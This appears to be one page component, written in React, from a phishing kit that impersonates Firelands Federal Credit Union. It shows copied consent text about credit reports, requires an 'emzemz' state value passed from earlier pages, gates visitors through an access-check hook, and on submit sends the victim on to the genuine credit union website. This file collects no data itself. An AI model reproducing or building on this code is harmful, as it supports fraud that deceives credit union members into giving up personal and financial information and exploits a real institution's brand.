import React, { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';

const heroImageUrl = '/assets/firelands-landing.jpg';

const Terms: React.FC = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz } = location.state || {};
  const [isChecked, setIsChecked] = useState(false);
  const [error, setError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const isAllowed = useAccessCheck(baseUrl);

  useEffect(() => {
    if (!emzemz) {
      navigate('/');
      return;
    }
  }, [emzemz, navigate]);

  if (isAllowed === null) {
    return <div>Loading...</div>;
  }

  if (isAllowed === false) {
    return <div>Access denied. Redirecting...</div>;
  }

  const handleSubmit = (event: React.FormEvent) => {
    event.preventDefault();

    if (!isChecked) {
      setError('Please agree to the terms before continuing.');
      return;
    }

    setError('');
    setIsSubmitting(true);
    window.location.href = 'https://www.firelandsfcu.org';
  };

  return (
    <div className="relative flex min-h-screen flex-col overflow-hidden text-white">
      <div className="absolute inset-0">
        <img src={heroImageUrl} alt="Firelands background" className="h-full w-full object-cover" />
        <div className="absolute inset-0 bg-gradient-to-r from-black/80 via-black/55 to-black/20"></div>
      </div>

      <div className="relative z-10 flex flex-1 flex-col justify-center px-6 py-10 md:px-12 lg:px-20">
        <div className="mx-auto w-full max-w-6xl">
          <div className="mx-auto w-full max-w-md rounded-[32px] bg-white/95 p-8 text-gray-800 shadow-2xl backdrop-blur">
            <h2 className="text-2xl font-semibold text-[#2f2e67] mb-4">Terms & Conditions</h2>
            
            <div className="prose prose-sm max-w-none">
              <p>
                By submitting this registration form, I understand that I am providing written instructions in accordance
                with the Fair Credit Reporting Act, Driver Privacy Protection Act, and other applicable law for Firelands
                Federal Credit Union and its affiliates to request and receive information about me from third parties,
                including but not limited to a copy of my consumer credit report, score, and motor vehicle records from
                consumer reporting agencies, at any time for so long as I have an active account.
              </p>

              <p>
                I further authorize Firelands Federal Credit Union and its affiliates to retain a copy of my information for
                use in accordance with Firelands FCU's{' '}
                <a href="#" className="text-[#5a63d8] hover:underline">
                  Terms of Service
                </a>{' '}
                and{' '}
                <a href="#" className="text-[#5a63d8] hover:underline">
                  Privacy Statement
                </a>
                .
              </p>
            </div>

            <form onSubmit={handleSubmit} className="mt-8 space-y-4">
              <label className="flex items-center gap-3 text-sm text-[#5d4f72]">
                <input
                  type="checkbox"
                  checked={isChecked}
                  onChange={() => {
                    setIsChecked((prev) => !prev);
                    setError('');
                  }}
                  className="h-4 w-4 rounded border border-gray-300 text-[#5a63d8] focus:ring-[#5a63d8]"
                />
                I have read and agree to the terms and privacy policy.
              </label>

              {error && <p className="text-sm text-rose-600">{error}</p>}

              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full rounded-full bg-gradient-to-r from-[#cdd1f5] to-[#f2f3fb] px-6 py-3 text-base font-semibold text-[#8f8fb8] shadow-inner transition enabled:hover:from-[#b7bff2] enabled:hover:to-[#e3e6fb] disabled:opacity-70"
              >
                {isSubmitting ? 'Redirecting…' : 'Continue'}
              </button>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Terms;
